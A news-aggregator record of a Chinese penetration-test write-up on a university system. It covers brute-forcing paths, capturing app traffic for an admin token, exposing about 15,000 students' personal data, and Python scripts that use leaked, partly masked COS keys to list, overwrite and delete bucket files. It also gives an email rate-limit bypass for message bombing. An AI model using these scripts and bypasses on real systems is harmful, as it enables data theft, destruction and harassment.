[{"_1":2,"_3":4},"root",{"_5":118},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1794530487000,"id","kwg7oq0syemuiq4bnt02ntr3s","title","某高校 EDU 系统越权测试导致学生信息泄露、COS 存储桶失陷与短信轰炸","originalTitle","记一次EDU的空白页渗透","summary","作者对某高校 EDU 系统开展渗透测试，通过资产收集、路径爆破和移动端 APP 抓包获得管理端 token 与 COOKIE，随后越权查询到约 1w5 名学生的姓名、手机号和头像。","reason","文章完整记录从资产探测、隐藏参数挖掘到 APP 抓包的越权测试路径，并展示存储桶泄露及短信轰炸的验证过程。","source",{"_75":117},"links",{"_109":116},"publishedAt","2026-11-10T07:04:58.000Z","discoveredAt","2026-11-12T03:24:28.858Z","timelineAt","category","disclosure","tags",[76,112,113,78,114,115],"score",72,"selected",true,"channel","news","story",{"_86":87,"_13":88},"x","readingMode","full","author","body",{"_61":108,"_109":-5,"_110":109,"_111":37},"outline",[89,90,91,92,93],"relatedStories",[85],"topics",[68,69,70,71,72],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fEJhPiyN-DaE","reportCount",1,"additionalSourceCount",0,{"_73":83,"_75":84},{"_73":81,"_75":82},{"_73":79,"_75":80},{"_73":77,"_75":78},{"_73":74,"_75":76},"slug","research","name","技术研究","ai-offense","AI 攻防","red-team","红队与渗透","cloud-native","云与原生","tencent","腾讯安全",{"_86":87,"_13":88},"publicId","e8902f16-aa6d-4abc-9fb1-ce12c90383a5","高校EDU越权与COS密钥泄露",{"_11":106,"_95":107,"_97":105},{"_11":103,"_95":104,"_97":105},{"_11":101,"_95":102,"_97":98},{"_11":99,"_95":100,"_97":98},{"_11":94,"_95":96,"_97":98},"sec-5","text","3、短信轰炸","level",3,"sec-4","2、存储桶任意文件上传、覆盖、列桶","sec-3","1、越权获取全校学生手机号、姓名、人脸","sec-2","漏洞发现",2,"sec-1","信息收集","<h2 id=\"sec-1\">信息收集</h2><p>首先，通过fofa，hunter信息收集发现了如下资产</p><p>https://xxxx.edu.cn:8081</p><p>https://xxxx.edu.cn:9443</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1449%2Ff161a9e3-5ec.png&amp;mode=full&amp;exp=1794787200&amp;sig=5e5b395837d4db37\" loading=\"lazy\" decoding=\"async\"></p><p>但是直接访问发现显示路由校验失败</p><p>不是显示没有授权、404而是路由校验失败</p><p>所以这里猜测如果有了合适的路由大概率就能够正常访问了</p><p>于是在这个思路的加持下打算点一下上帝之眼查看具体路径</p><p>然后复制全部路径放BP里进行爆破</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1450%2F3226fd09-1e2.png&amp;mode=full&amp;exp=1794787200&amp;sig=539946554606a547\" loading=\"lazy\" decoding=\"async\"></p><p>爆破下发现都是200，我都以为要出货了，没想到访问后显示需要登录（bushi）</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1450%2F9188d311-450.png&amp;mode=full&amp;exp=1794787200&amp;sig=423abf871aebc515\" loading=\"lazy\" decoding=\"async\"></p><p>随便调了一个URL https://xxxxxx.edu.cn:8081/subpages/admin/home/home</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1450%2F75c92bbe-7b1.png&amp;mode=full&amp;exp=1794787200&amp;sig=39e9cbfbd36ab9b1\" loading=\"lazy\" decoding=\"async\"></p><p>发现显示报错；没辙了只能把接口发给ai做进一步测试</p><p>AI果然还是厉害，发现这个路径还隐藏了一个token参数</p><p><a href=\"https://xxxxxxx.edu.cn:8081/subpages/admin/home/home?token=\">https://xxxxxxx.edu.cn:8081/subpages/admin/home/home?token=</a></p><p>同时因为这个网站同样也是某APP的HOST</p><p>那现在就有思路了，只要我用手机抓包，然后获得COOKIE后再拼接到token后，那不就能做进一步测试了</p><p>这里因为这个APP并没有进行虚拟机校验，所以我这里采用的方法是使用小黄鸟和BP联动，能够直接将手机端APP的流量直接导入至Brup中</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1454%2Fd972ce1c-f5d.png&amp;mode=full&amp;exp=1794787200&amp;sig=c4c32d752c52e1a5\" loading=\"lazy\" decoding=\"async\"></p><p>然后就能愉快的开始抓包了~</p><h2 id=\"sec-2\">漏洞发现</h2><h3 id=\"sec-3\">1、越权获取全校学生手机号、姓名、人脸</h3><p>回到最开始的URL，我们既然获取到了token肯定就能测了，</p><p><a href=\"https://xxxx.xxxx.edu.cn:8081/subpages/admin/home/home?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.*****************************.k\">https://xxxx.xxxx.edu.cn:8081/subpages/admin/home/home?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.*****************************.k</a></p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1455%2F3f10e5ed-7e2.png&amp;mode=full&amp;exp=1794787200&amp;sig=63787ff7b6aa1859\" loading=\"lazy\" decoding=\"async\"></p><p>虽然显示获取失败，但是它都说我是管理员了，我肯定能访问一点接口吧</p><p>然后挨个点点发现了在学生信息查询这里</p><p>直接查询成功</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1455%2Fea600915-e0f.png&amp;mode=full&amp;exp=1794787200&amp;sig=4b61f0b2409bf8aa\" loading=\"lazy\" decoding=\"async\"></p><p>经过初步测试发现，通过越权能看到整个学校大概1w5同学姓名、手机号、头像</p><h3 id=\"sec-4\">2、存储桶任意文件上传、覆盖、列桶</h3><p>既然能抓包了肯定得到处看看</p><p>在工单提交界面发现了个文件上传的接口</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1455%2Fc8e65021-d9f.png&amp;mode=full&amp;exp=1794787200&amp;sig=c137dbec787e72c4\" loading=\"lazy\" decoding=\"async\"></p><p>上传一下</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1456%2F780c427a-469.png&amp;mode=full&amp;exp=1794787200&amp;sig=c6186bca332d0883\" loading=\"lazy\" decoding=\"async\"></p><p>wok！出货了</p><p>这不就是标准的存储桶临时密钥泄露</p><p>火速喊ai搓个脚本然后遍历下</p><pre><code>from qcloud_cos import CosConfig, CosS3Client\n\n\n# =========================\n# COS 存储桶配置\n# =========================\nBUCKET = \"sport-88888888\"\nREGION = \"ap-guangzhou\"\n\n\n# =========================\n# 临时密钥配置\n# 填入你的临时密钥\n# =========================\nTMP_SECRET_ID = \"AKIDHMbIQpWwh*********a4uajnZbYSDH\"\nTMP_SECRET_KEY = \"r7ftHbfJuyrjTR********QnUfaSi1ejtA10=\"\nSESSION_TOKEN = \"yw5CienBBXFVR3j73Cz0w********wGq8XhkQ\"\n\n\ndef list_bucket(prefix: str = \"\", max_keys: int = 1000, output_file: str = \"cos_urls.txt\"):\n    config = CosConfig(\n        Region=REGION,\n        SecretId=TMP_SECRET_ID,\n        SecretKey=TMP_SECRET_KEY,\n        Token=SESSION_TOKEN,\n        Scheme=\"https\"\n    )\n\n    client = CosS3Client(config)\n\n    marker = \"\"\n    total = 0\n\n    print(f\"[+] Bucket: {BUCKET}\")\n    print(f\"[+] Region: {REGION}\")\n    print(f\"[+] Prefix: {prefix if prefix else '(根目录)'}\")\n    print(f\"[+] URL 输出文件: {output_file}\")\n    print(\"=\" * 80)\n\n    with open(output_file, \"w\", encoding=\"utf-8\") as f:\n        while True:\n            response = client.list_objects(\n                Bucket=BUCKET,\n                Prefix=prefix,\n                Marker=marker,\n                MaxKeys=max_keys\n            )\n\n            contents = response.get(\"Contents\", [])\n\n            for item in contents:\n                key = item.get(\"Key\")\n                size = item.get(\"Size\")\n                last_modified = item.get(\"LastModified\")\n                storage_class = item.get(\"StorageClass\", \"\")\n\n                total += 1\n\n                url = f\"https://{BUCKET}.cos.{REGION}.myqcloud.com/{key}\"\n\n                # 控制台输出详情\n                print(f\"[{total}] {key}\")\n                print(f\"    Size: {size} bytes\")\n                print(f\"    LastModified: {last_modified}\")\n                print(f\"    StorageClass: {storage_class}\")\n                print(f\"    URL: {url}\")\n                print(\"-\" * 80)\n\n                # 只把 URL 写入 txt，一行一个\n                f.write(url + \"\\n\")\n\n            is_truncated = response.get(\"IsTruncated\")\n\n            if is_truncated == \"true\" or is_truncated is True:\n                marker = response.get(\"NextMarker\")\n                if not marker:\n                    break\n            else:\n                break\n\n    print(f\"[+] 列桶完成，共发现 {total} 个对象\")\n    print(f\"[+] URL 已保存到: {output_file}\")\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Tencent COS 临时密钥列桶并导出 URL\")\n\n    parser.add_argument(\n        \"--prefix\",\n        default=\"\",\n        help=\"只列出指定前缀下的对象，例如 H5_file/、test/、uploads/。默认列根目录\"\n    )\n\n    parser.add_argument(\n        \"--max-keys\",\n        type=int,\n        default=1000,\n        help=\"每次请求返回数量，最大通常为 1000\"\n    )\n\n    parser.add_argument(\n        \"--output\",\n        default=\"cos_urls.txt\",\n        help=\"导出的 URL 文件名，默认 cos_urls.txt\"\n    )\n\n    args = parser.parse_args()\n\n    list_bucket(\n        prefix=args.prefix,\n        max_keys=args.max_keys,\n        output_file=args.output\n    )</code></pre><p>成功列出44252条存储桶数据</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1457%2Fe0e16799-dfa.png&amp;mode=full&amp;exp=1794787200&amp;sig=28ba166d4c8e4afe\" loading=\"lazy\" decoding=\"async\"></p><p>在有了具体的路径，可以通过已知的路径直接进行覆盖，具体的上传脚本如下</p><pre><code>\n# -*- coding: utf-8 -*-\n\n\"\"\"\n腾讯云 COS 临时密钥文件管理脚本（修复代理版）\n\n修复：\n1. 强制关闭 requests 环境代理\n2. 禁止 WinHTTP/系统代理影响 COS SDK\n3. 打印实际代理配置方便排查\n\"\"\"\n\nimport argparse\nimport os\n\n# 强制清理环境代理\nfor k in [\n    \"HTTP_PROXY\",\n    \"HTTPS_PROXY\",\n    \"http_proxy\",\n    \"https_proxy\",\n    \"ALL_PROXY\",\n    \"all_proxy\",\n]:\n    os.environ.pop(k, None)\n\nfrom qcloud_cos import CosConfig, CosS3Client\n\n\nBUCKET = \"sport-1******\"\nREGION = \"ap-guangzhou\"\n\n\nTMP_SECRET_ID = \"AKIDyZcXif*****Mz2C2nqFeu1f52F9f7oP5bhH6wdNIJO\"\nTMP_SECRET_KEY = \"9mvdJ53Wp2jh******+/QpiHo0eCT7UeRo=\"\nSESSION_TOKEN = \"unYwrGxsLBLaj6G******lFBX3WBASrLAsMH44KDwds1snsmjjTNvJWVG96Zyo2H9oTA\"\n\n\n\ndef get_client():\n\n    config = CosConfig(\n        Region=REGION,\n        SecretId=TMP_SECRET_ID,\n        SecretKey=TMP_SECRET_KEY,\n        Token=SESSION_TOKEN,\n        Scheme=\"https\",\n        Proxies={}\n    )\n\n    client = CosS3Client(config)\n\n    # 强制 requests 不读取系统代理\n    client._session.trust_env = False\n\n    print(\"[DEBUG] COS Proxy:\")\n    print(client._conf._proxies)\n\n    return client\n\n\n\ndef upload_file(local_file, cos_key):\n\n    client = get_client()\n\n    if not os.path.exists(local_file):\n        print(\"[!] 文件不存在:\", local_file)\n        return\n\n    print(\"[+] 开始上传\")\n    print(\"本地文件:\", local_file)\n    print(\"COS路径:\", cos_key)\n\n    with open(local_file, \"rb\") as f:\n        response = client.put_object(\n            Bucket=BUCKET,\n            Body=f,\n            Key=cos_key\n        )\n\n    print(\"\\n[+] 上传成功\")\n    print(\"ETag:\", response.get(\"ETag\"))\n\n    url = f\"https://{BUCKET}.cos.{REGION}.myqcloud.com/{cos_key}\"\n    print(\"URL:\")\n    print(url)\n\n\n\ndef delete_file(cos_key):\n\n    client = get_client()\n\n    print(\"[+] 删除:\", cos_key)\n\n    response = client.delete_object(\n        Bucket=BUCKET,\n        Key=cos_key\n    )\n\n    print(\"[+] 删除完成\")\n    print(response)\n\n\n\ndef check_file(cos_key):\n\n    client = get_client()\n\n    try:\n        response = client.head_object(\n            Bucket=BUCKET,\n            Key=cos_key\n        )\n\n        print(\"[+] 文件存在\")\n        print(response)\n\n    except Exception as e:\n        print(\"[-] 文件不存在\")\n        print(e)\n\n\n\nif __name__ == \"__main__\":\n\n    parser = argparse.ArgumentParser(\n        description=\"腾讯云 COS 临时密钥上传删除工具\"\n    )\n\n    sub = parser.add_subparsers(dest=\"action\")\n\n\n    upload = sub.add_parser(\"upload\")\n    upload.add_argument(\"--file\", required=True)\n    upload.add_argument(\"--key\", required=True)\n\n\n    delete = sub.add_parser(\"delete\")\n    delete.add_argument(\"--key\", required=True)\n\n\n    check = sub.add_parser(\"check\")\n    check.add_argument(\"--key\", required=True)\n\n\n    args = parser.parse_args()\n\n\n    if args.action == \"upload\":\n\n        upload_file(\n            args.file,\n            args.key\n        )\n\n    elif args.action == \"delete\":\n\n        delete_file(\n            args.key\n        )\n\n    elif args.action == \"check\":\n\n        check_file(\n            args.key\n        )\n\n    else:\n        parser.print_help()</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1459%2F2fadbf73-435.png&amp;mode=full&amp;exp=1794787200&amp;sig=476da9da9d550c42\" loading=\"lazy\" decoding=\"async\"></p><p>访问可发现上传成功</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1501%2F66435452-c31.png&amp;mode=full&amp;exp=1794787200&amp;sig=956b5321ed0d3899\" loading=\"lazy\" decoding=\"async\"></p><p>当我们使用脚本修改a.txt再次上传后</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1501%2F01aab7f5-bf7.png&amp;mode=full&amp;exp=1794787200&amp;sig=d7c832465e7f0375\" loading=\"lazy\" decoding=\"async\"></p><p>我们能够发现能够成功覆盖</p><p>通过该脚本也可以使用delete进行任意文件删除</p><p>具体命令如下 python <a href=\"http://a.py/\">a.py</a> delete --key H5_file/abcsdf.txt</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1502%2F1ee83389-819.png&amp;mode=full&amp;exp=1794787200&amp;sig=529c784e1d8fe155\" loading=\"lazy\" decoding=\"async\"><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1502%2F3c478402-a8d.png&amp;mode=full&amp;exp=1794787200&amp;sig=be1cf6342b9659c5\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"sec-5\">3、短信轰炸</h3><p>在模拟器安装证书之后，</p><p>登录后点击设置----&gt;修改邮箱</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1503%2F6ade1f4e-82c.png&amp;mode=full&amp;exp=1794787200&amp;sig=e81d1fe1f3f51480\" loading=\"lazy\" decoding=\"async\"></p><p>输入邮箱然后进行抓包</p><p>具体数据包如下</p><pre><code>PUT /user/2300130501/ HTTP/1.1\nAuthorization: ******\nuser-agent: Mozilla/5.0 (Linux; Android 14; RMX5200 Build/UQ1A.240205.06151050; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/146.0.7680.119 Safari/537.36 uni-app Html5Plus/1.0 (Immersed/24.0)\nContent-Type: application/json\nContent-Length: 31\nHost: *******.edu.cn:9443\nConnection: keep-alive\nAccept-Encoding: gzip, deflate, br\n \n{\"email\":\"【填入邮箱】\"}</code></pre><p>如果正常发包在第11个数据包会出现500报错，具体报错如下</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1504%2Fe399074b-534.png&amp;mode=full&amp;exp=1794787200&amp;sig=faf3867eac84600e\" loading=\"lazy\" decoding=\"async\"></p><p>这里可以构造大小写不同但是发送内容是一致的邮箱进行绕过</p><p>比如</p><pre><code>A13*****975@163.com\nA13*****975@163.COM\na13*****975@163.CoM\na13*****975@163.COm\n.....</code></pre><p>其中acom均可使用大小写进行绕过，四个可排列组合共16种，可绕过单个邮箱10次限制</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2F2026%2F11%2F10%2F1504%2F3967e21c-e07.png&amp;mode=full&amp;exp=1794787200&amp;sig=3f84a2a79a5a77e9\" loading=\"lazy\" decoding=\"async\"></p>","original","zhKind","complete","漏洞分析","红队","云原生","腾讯","https://xz.aliyun.com/news/93055","先知社区",{"_119":120,"_121":-5},"changelogVersion","2026-10-01T08:00","release"]
